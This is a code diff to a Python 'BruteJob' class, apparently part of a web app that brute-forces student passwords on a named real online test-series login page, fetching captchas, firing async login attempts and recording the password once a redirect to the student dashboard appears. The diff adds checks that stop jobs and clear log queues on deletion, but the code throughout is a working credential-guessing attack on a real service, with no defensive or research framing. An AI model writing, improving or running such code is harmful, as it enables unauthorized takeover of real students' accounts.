@@ -221,11 +221,19 @@ class BruteJob:
         except Exception as e:
             self.log_queue.put(f"❌ Unhandled error: {traceback.format_exc()}")
         finally:
+            # Only save if not deleted
             if not self.deleted:
                 if self.status != 'stopped':
                     self.status = 'success' if self.password else 'failed'
                 self.end_time = datetime.utcnow().isoformat()
                 self.save_to_db()
+            else:
+                # Ensure we don't leave any log messages behind
+                while not self.log_queue.empty():
+                    try:
+                        self.log_queue.get_nowait()
+                    except:
+                        break
 
     async def _async_bruteforce(self):
         """Main async loop: process passwords from current_index to end."""
@@ -256,7 +264,7 @@ class BruteJob:
 
             tasks = []
             for idx in range(self.current_index, self.total_passwords):
-                if self.stop_flag:
+                if self.stop_flag or self.deleted:
                     break
                 password = self.passwords_to_try[idx]
                 tasks.append(asyncio.create_task(
@@ -265,7 +273,7 @@ class BruteJob:
 
             found = None
             session_obj = None
-            while not self.stop_flag:
+            while not self.stop_flag and not self.deleted:
                 try:
                     found, session_obj = await asyncio.wait_for(result_queue.get(), timeout=1.0)
                     break
@@ -289,7 +297,7 @@ class BruteJob:
                     except Exception as e:
                         log_queue.put_nowait(f"⚠️ Dashboard save error: {e}")
             else:
-                if not self.stop_flag:
+                if not self.stop_flag and not self.deleted:
                     log_queue.put_nowait("❌ No password found in that year.")
 
     async def _worker(self, session, user_id, password, semaphore, result_queue, stop_event, log_queue, idx):
@@ -345,6 +353,8 @@ class BruteJob:
 
     async def _fetch_captcha(self, session, log_queue):
         for attempt in range(3):
+            if self.stop_flag or self.deleted:
+                return None
             try:
                 rand = int(time.time() * 1000) + attempt + os.getpid()
                 url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
@@ -386,6 +396,8 @@ class BruteJob:
                 allow_redirects=False,
                 timeout=aiohttp.ClientTimeout(total=LOGIN_TIMEOUT)
             ) as resp:
+                if self.stop_flag or self.deleted:
+                    return False, "aborted"
                 if resp.status == 302:
                     location = resp.headers.get("Location", "")
                     if "dashboard/student-dashboard.php" in location:
@@ -430,11 +442,11 @@ class BruteJob:
                         self.password = msg.split("Password =")[-1].strip()
                     self.status = 'success'
                 if len(self.logs) % 5 == 0:
-                    self.save_to_db()
+                    self.save_to_db()  # this will skip if deleted
             except:
                 break
         if new_logs:
-            self.save_to_db()
+            self.save_to_db()  # skip if deleted
         return new_logs
 
 
@@ -804,6 +816,12 @@ def delete_job(job_id):
             job.stop()
         # Mark as deleted to prevent further saves
         job.deleted = True
+        # Clear any pending logs to prevent future get_updates from saving
+        while not job.log_queue.empty():
+            try:
+                job.log_queue.get_nowait()
+            except:
+                break
         # Remove from in-memory dict
         del jobs[job_id]
     # Delete from MongoDB
@@ -821,6 +839,12 @@ def delete_all_jobs():
         if job.status == 'running':
             job.stop()
         job.deleted = True
+        # Clear log queues
+        while not job.log_queue.empty():
+            try:
+                job.log_queue.get_nowait()
+            except:
+                break
     # Clear in-memory dict
     jobs.clear()
     # Delete all from MongoDB
